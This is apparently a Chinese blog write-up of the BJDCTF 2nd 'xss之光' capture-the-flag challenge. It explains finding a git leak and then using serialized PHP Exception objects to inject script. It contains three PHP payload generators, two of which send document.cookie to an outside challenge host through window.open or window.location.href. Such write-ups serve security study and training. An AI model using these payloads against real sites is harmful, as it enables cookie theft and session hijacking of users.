---
title: BJDCTF 2nd xss之光
date: 2021-04-01 15:52:48
tags: wp

---
## '-'-'
![](https://ftp.bmp.ovh/imgs/2021/04/6b7c495f5410b55c.png) 
打开就个这    
其他什么也没     
dirsearch扫的话会429，加-s还是会429？？？      
看了WP是git泄露        
githack一下
![](https://ftp.bmp.ovh/imgs/2021/04/92d01a33b6c1a59a.png) 
![](https://ftp.bmp.ovh/imgs/2021/04/15257587e78dc396.png) 
就这？？      
没类？？     

用原生类---[Exception](https://www.php.net/manual/zh/class.exception.php)---所有异常的基类     

然后弹cookie    



	```php
	<?php
	$a=new Exception("<script>alert(document.cookie)</script>");
	echo urlencode(serialize($a));
	
	?> 
	```



`window.open`----->打开新窗口     



	```php
	<?php
	$a=new Exception("<script>window.open('http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/'+document.cookie);</script>");
	echo urlencode(serialize($a));
	
	?> 
	```



`window.location.href='url'`---->实现恶意跳转       




	```php
	<?php
	$a=new Exception("<script>window.location.href='http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/'+document.cookie</script>");
	echo urlencode(serialize($a));
	
	?> 
	```



## 芝士·      
[利用php的原生类进行XSS](https://blog.csdn.net/qq_45521281/article/details/105812056)


